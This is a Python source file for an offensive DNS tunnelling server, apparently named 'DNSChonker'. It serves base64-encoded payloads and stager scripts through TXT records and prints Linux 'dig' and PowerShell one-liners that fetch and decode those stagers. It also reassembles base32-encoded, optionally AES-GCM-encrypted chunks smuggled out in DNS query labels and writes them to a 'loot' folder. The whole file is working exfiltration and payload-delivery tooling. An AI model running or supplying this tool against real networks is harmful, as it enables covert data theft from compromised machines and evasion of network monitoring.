from datetime import datetime
import argparse
import base64
import hashlib
import secrets
import socket
import time
import zlib
from pathlib import Path
from string import Template
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.exceptions import InvalidTag
import dns.message
import dns.rrset
import dns.rdataclass
import dns.rdatatype
import dns.flags
import os

# DOS protection and limits
MAX_SESSIONS = 20
SESSION_TIMEOUT = 300      # seconds to evict stale sessions
MAX_CHUNKS = 5000          # per-session chunk limit
MAX_PAYLOAD_SIZE = 100 * 1024 * 1024  # 100 MiB

# load our two templates from disk
TEMPLATE_DIR = Path(__file__).parent / 'templates'
LSTUB_TEMPLATE = Template((TEMPLATE_DIR / 'downloadhelper_linux.tpl').read_text())
LUSTUB_TEMPLATE = Template((TEMPLATE_DIR / 'uploadhelper_linux.tpl').read_text())
WSTUB_TEMPLATE = Template((TEMPLATE_DIR / 'downloadhelper_windows.tpl').read_text())
WUSTUB_TEMPLATE = Template((TEMPLATE_DIR / 'uploadhelper_windows.tpl').read_text())

def split_into_chunks(s: str, size: int) -> list[str]:
    return [s[i:i+size] for i in range(0, len(s), size)]


def derive_key(key_str: str) -> bytes:
    try:
        raw = bytes.fromhex(key_str)
        if len(raw) == 32:
            return raw
    except Exception:
        pass
    return hashlib.sha256(key_str.encode()).digest()


def start_server(args):
    if args.customhelper:
        helper_name = args.customhelper.rstrip('.').lower()
        tpl_path    = TEMPLATE_DIR / f"{helper_name}.tpl"
        CSTUB_TEMPLATE = Template(tpl_path.read_text())
        # now you can use CSTUB_TEMPLATE.substitute(...) later
    else:
        CSTUB_TEMPLATE = None
    domain = args.domain.rstrip('.').lower()
    domain_labels = tuple(domain.split('.'))

    # read file and split into base64 data_chunks
    file_chunks: list[str] = []
    if args.file:
        file_bytes = Path(args.file).read_bytes()
        file_b64 = base64.b64encode(file_bytes).decode()
        file_chunks = split_into_chunks(file_b64, 255)

    # assign a dedicated file-share ID (fid)
    fid = secrets.token_hex(2)

    # build TXT map for file data under fid
    txt_map: dict[tuple[str, ...], str] = {}
    for idx, chunk in enumerate(file_chunks, start=1):
        txt_map[(str(idx), fid)] = chunk
    if file_chunks:
        txt_map[(fid,)]     = file_chunks[0]
        txt_map[('0', fid)] = file_chunks[0]

    # generate helper IDs per OS
    download_ids = {os_type: secrets.token_hex(2) for os_type in ['linux', 'windows']}
    upload_ids   = {os_type: secrets.token_hex(2) for os_type in ['linux', 'windows']}

    # prepare script storage
    download_scripts: dict[str, str] = {}
    upload_scripts:   dict[str, str] = {}

    # build download and upload stubs for each OS
    if args.customhelper:
            cid   = secrets.token_hex(2)
            cstub = CSTUB_TEMPLATE.substitute(
                        NUM_CHUNKS=len(file_chunks),
                        FID=fid,
                        DOMAIN=domain
                    )
            custom_script = cstub
            c64 = base64.b64encode(cstub.encode()).decode()
            for i, chunk in enumerate(split_into_chunks(c64,255), start=1):
               txt_map[(str(i), cid)] = chunk
            txt_map[(cid,)]     = c64
            txt_map[('0', cid)] = c64

    if args.usehelpers:
        # only build download stubs if a file was provided
        if args.file:
            for os_type in ['linux', 'windows']:
                did = download_ids[os_type]
                if os_type == 'linux':
                    stub = LSTUB_TEMPLATE.substitute(
                        NUM_CHUNKS=len(file_chunks),
                        FID=fid,
                        DOMAIN=domain
                    )
                else:
                    stub = WSTUB_TEMPLATE.substitute(
                        NUM_CHUNKS=len(file_chunks),
                        FID=fid,
                        DOMAIN=domain
                    )
                download_scripts[os_type] = stub

                b64_stub = base64.b64encode(stub.encode()).decode()
                for idx, chunk in enumerate(split_into_chunks(b64_stub, 255), start=1):
                    txt_map[(str(idx), did)] = chunk
                txt_map[(did,)]     = b64_stub
                txt_map[('0', did)] = b64_stub

        # always build upload stubs whenever --usehelpers is set
        for os_type in ['linux', 'windows']:
            uid = upload_ids[os_type]
            if os_type == 'linux':
                ustub = LUSTUB_TEMPLATE.substitute(
                    FID=fid,
                    DOMAIN=domain
                )
            else:
                ustub = WUSTUB_TEMPLATE.substitute(
                    FID=fid,
                    DOMAIN=domain
                )
            upload_scripts[os_type] = ustub

            u64 = base64.b64encode(ustub.encode()).decode()
            txt_map[(uid,)]     = u64
            txt_map[('0', uid)] = u64

    banner = r"""
      ██            ██                        
    ██░░██        ██░░██                      
    ██░░▒▒████████▒▒░░██                ████  
  ██▒▒░░░░▒▒▒▒░░▒▒░░░░▒▒██            ██░░░░██
  ██░░░░░░░░░░░░░░░░░░░░██            ██  ░░██
██▒▒░░░░░░░░░░░░░░░░░░░░▒▒████████      ██▒▒██
██░░  ██  ░░██░░  ██  ░░  ▒▒  ▒▒  ██    ██░░██
██░░░░░░░░██░░██░░░░░░░░░░▒▒░░▒▒░░░░██████▒▒██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██  
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██  
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██    
  ██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██      
    ██▒▒░░▒▒▒▒░░▒▒░░░░░░▒▒░░▒▒▒▒░░▒▒██        
      ██░░████░░██████████░░████░░██          
      ██▓▓░░  ▓▓██░░  ░░██▓▓  ░░▓▓██          

                                                                                                         
██████╗ ███╗   ██╗███████╗ ██████╗██╗  ██╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗████╗  ██║██╔════╝██╔════╝██║  ██║██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██╔██╗ ██║███████╗██║     ███████║██║   ██║██╔██╗ ██║█████╔╝ █████╗  ██████╔╝
██║  ██║██║╚██╗██║╚════██║██║     ██╔══██║██║   ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║ ╚████║███████║╚██████╗██║  ██║╚██████╔╝██║ ╚████║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""
    print(banner)
    if args.key:
        key = derive_key(args.key)
        print(f"[*] AES key (supplied): {args.key}")
    elif args.encrypt:
        key = secrets.token_bytes(32)
        print(f"[*] Generated AES key: {key.hex()}")
    else:
        key = None

    if args.compress:
        print(f"[*] Compression Enabled")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.ip, args.port))
    print(f"[*] Listening on {args.ip}:{args.port} for '{domain}'")
    if args.file:
        print(f"[*] Shared file '{args.file}' chunked under ID {fid} into {len(file_chunks)} chunks over *.{fid}.{domain}")
        print()

    if args.customhelper:
     print(f"[*] Custom helper {cid}.{domain}")
     print(custom_script)

    # advertise download/helpers
    if args.usehelpers:
        if args.file:
            for os_type in ['linux', 'windows']:
                did = download_ids[os_type]
                if os_type == 'linux':
                    print(f"[*] Download Stage1 Helper ({os_type}) for {did}.{domain}")
                    print(f"dig {did}.{domain} txt +short | tr -d '\"' | base64 -d\n")
                    print(f"[*] Download Stage2 Helper ({os_type}) at {did}.{domain}")
                    print(download_scripts[os_type])
                else:
                    print(f"[*] Download Stage1 Helper ({os_type}) for {did}.{domain}")
                    print(f"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Resolve-DnsName {did}.{domain} -Type TXT).Strings-join''))\n")
                    print(f"[*] Download Stage2 Helper ({os_type}) at {did}.{domain}")
                    print(download_scripts[os_type])
                print()

        # advertise upload helpers
        for os_type in ['linux', 'windows']:
            uid = upload_ids[os_type]
            if os_type == 'linux':
                print(f"[*] Upload Stage1 Helper ({os_type}) for {uid}.{domain}")
                print(f"dig {uid}.{domain} txt +short | tr -d '\"' | base64 -d\n")
                print(f"[*] Upload Stage2 Helper ({os_type}) at {uid}.{domain}")
                print(upload_scripts[os_type])
            else:
                print(f"[*] Upload Stage1 Helper ({os_type}) for {uid}.{domain}")
                print(f"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Resolve-DnsName {uid}.{domain} -Type TXT).Strings-join''))\n")
                print(f"[*] Upload Stage2 Helper ({os_type}) at {uid}.{domain}")
                print(upload_scripts[os_type])
            print()
    # session/exfil loop
    sessions: dict[str, dict[int, str]] = {}
    session_times: dict[str, float] = {}
    seen_sids: set[str] = set()
    written: set[str] = set()

    while True:
        now = time.time()
        expired = [sid for sid, ts in session_times.items() if now - ts > SESSION_TIMEOUT]
        for sid in expired:
            sessions.pop(sid, None)
            session_times.pop(sid, None)

        data, addr = sock.recvfrom(512)
        try:
            msg = dns.message.from_wire(data)
            q = msg.question[0]
            labels = q.name.to_text().rstrip('.').lower().split('.')
            rtype = q.rdtype
        except Exception:
            continue

        client_ip = addr[0]
        if args.debug:
            print(f"[DEBUG] Query {dns.rdatatype.to_text(rtype)} for {labels} from {client_ip}")

        # TXT-record bootstraps
        if rtype == dns.rdatatype.TXT and tuple(labels[-len(domain_labels):]) == domain_labels:
            prefix = tuple(labels[:-len(domain_labels)])
            if prefix in txt_map:
                resp = dns.message.make_response(msg)
                resp.flags |= dns.flags.AA
                for chunk in split_into_chunks(txt_map[prefix], 255):
                    rr = dns.rrset.from_text_list(q.name, 60, dns.rdataclass.IN, dns.rdatatype.TXT, [f'"{chunk}"'])
                    resp.answer.append(rr)
                sock.sendto(resp.to_wire(), addr)
                continue

        # Exfil chunk handling
        if rtype not in (dns.rdatatype.TXT, dns.rdatatype.A):
            continue
        if tuple(labels[-len(domain_labels):]) != domain_labels or len(labels) < 3:
            continue

        sid, idx_str, chunk = labels[0], labels[1], labels[2]
        try:
            idx = int(idx_str)
        except ValueError:
            continue

        if sid not in sessions and len(sessions) >= MAX_SESSIONS:
            if args.debug:
                print(f"[WARNING] Max sessions reached ({MAX_SESSIONS}), dropping session '{sid}'")
            continue
        if sid not in sessions:
            sessions[sid] = {}
            if sid not in seen_sids:
                print(f"[INFO] New session {sid} from {client_ip}")
                seen_sids.add(sid)
        session_times[sid] = now

        if len(sessions[sid]) >= MAX_CHUNKS:
            if args.debug:
                print(f"[WARNING] Chunk limit exceeded for session '{sid}', dropping session")
            sessions.pop(sid, None)
            session_times.pop(sid, None)
            continue

        if idx in sessions[sid]:
            if args.debug:
                print(f"[DEBUG] Duplicate chunk {idx} for session {sid}, ignoring")
            continue
        sessions[sid][idx] = chunk

        if chunk == 'eof' and sid not in written:
            parts = ''.join(sessions[sid][i] for i in sorted(sessions[sid]) if sessions[sid][i] != 'eof')
            try:
                raw = base64.b32decode(parts.upper() + '=' * ((8 - len(parts) % 8) % 8))
            except Exception as e:
                if args.debug:
                    print(f"[ERROR] base32 decode failed for session {sid}: {e}")
                sessions.pop(sid, None)
                session_times.pop(sid, None)
                continue

            if len(raw) > MAX_PAYLOAD_SIZE:
                if args.debug:
                    print(f"[WARNING] Payload too large ({len(raw)} bytes) for session {sid}, dropping session")
                sessions.pop(sid, None)
                session_times.pop(sid, None)
                continue

            if key is not None:
                try:
                    aes = AESGCM(key)
                    raw = aes.decrypt(raw[:12], raw[12:], None)
                except (InvalidTag, ValueError) as e:
                    if args.debug:
                        print(f"[DEBUG] decryption failed for session {sid}: {e}")
                    sessions.pop(sid, None)
                    session_times.pop(sid, None)
                    continue

            if args.compress:
                try:
                    raw = zlib.decompress(raw)
                except Exception as e:
                    if args.debug:
                        print(f"[DEBUG] decompression failed for session {sid}: {e}")

            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            directory = "loot"
            os.makedirs(directory, exist_ok=True)
            fname = os.path.join(directory, f"session.{sid}.{timestamp}.bin")
            with open(fname, 'wb') as f:
                f.write(raw)
            print(f"[INFO] Wrote {fname}")
            written.add(sid)
            sessions.pop(sid, None)
            session_times.pop(sid, None)


def main():
    p = argparse.ArgumentParser(description="DNS exfil + per-OS helpers")
    p.add_argument("--ip", default="0.0.0.0")
    p.add_argument("--port", type=int, default=53)
    p.add_argument("--domain", required=True)
    p.add_argument("--key")
    p.add_argument("--encrypt", action="store_true")
    p.add_argument("--compress", action="store_true")
    p.add_argument("--debug", action="store_true")
    p.add_argument("-f", "--file", dest="file")
    p.add_argument("-uh", "--usehelpers", action="store_true")
    p.add_argument("-ch", "--customhelper", dest="customhelper")
    args = p.parse_args()
    start_server(args)


if __name__ == "__main__":
    main()
